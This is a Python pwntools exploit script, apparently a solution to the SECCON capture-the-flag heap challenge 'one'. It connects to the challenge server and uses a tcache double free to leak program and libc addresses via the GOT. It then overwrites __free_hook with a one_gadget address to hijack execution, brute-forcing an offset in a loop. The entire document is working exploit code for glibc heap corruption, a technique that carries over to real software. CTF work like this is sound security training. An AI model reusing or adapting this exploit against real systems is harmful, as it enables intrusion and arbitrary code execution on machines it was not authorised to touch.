#!/usr/bin/env python
from pwn import *


def main(val):
    print "NOW: " + str(hex(val))
# conn = process("./one_ef36d5ef6169aeda65259f627f282930b93cf6e5")
    conn = remote("one.chal.seccon.jp", 18357)
# conn = remote("localhost", 3000)
    elf = ELF("./one_ef36d5ef6169aeda65259f627f282930b93cf6e5")
    libc = ELF("./libc-2.27.so_18292bd12d37bfaf58e8dded9db7f1f5da1192cb")
    one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]


    def menu():
        conn.recvuntil("> ")


    def add(name):
        menu()
        print "Add " + str(name)
        conn.sendline("1")
        conn.sendline(name)


    def show():
        menu()
        conn.sendline("2")


    def delete():
        menu()
        conn.sendline("3")


    def exit():
        menu()
        conn.sendline("0")


    # a = raw_input()
    add("A")
    conn.recvuntil("Done.")

    delete()
    delete()  # double free

    # avoid link to fastbin
    delete()
    delete()
    delete()

    show()

    tmp = u64(conn.recv(6) + "\x00\x00")
    print "tmp: " + str(hex(tmp))
    base_addr = tmp - 0x20300 - val  # what is 0xc00...?
    # base_addr = tmp - 0x203000 - 0x670 #- 0xc00  # what is 0xc00...?
    memo_addr = base_addr + 0x202050
    print "memo_addr: " + str(hex(memo_addr))
    print "base_addr: " + str(hex(base_addr))

    add(p64(memo_addr))
    conn.recvuntil("Done.")

    add(p64(memo_addr))
    conn.recvuntil("Done.")

    add(p64(elf.got["puts"] + base_addr))
    conn.recvuntil("Done.")

    show()
    leak_addr = u64(conn.recv(6) + "\x00\x00")
    libc_base = leak_addr - libc.symbols["puts"]
    free_hook = libc_base + libc.symbols["__free_hook"]
    print "libc_base: " + str(hex(libc_base))
    print "free_hook: " + str(hex(free_hook))

    conn.recvuntil("Done.")

    add(p64(memo_addr))
    delete()
    delete()

    conn.recvuntil("\n")
    "second double free"
    conn.recvuntil("\n")
    conn.recvuntil("\n")

    add(p64(free_hook))
    conn.recvuntil("Done.")

    add(p64(memo_addr))
    conn.recvuntil("Done.")

    add(p64(one_gadget[1] + libc_base))
    conn.recvuntil("Done.")

    delete()
    # conn.interactive()


if __name__ == "__main__":
    val = 0x70

    for i in range(100):
        try:
            main(val)
            val += 0x100
        except EOFError:
            val += 0x100
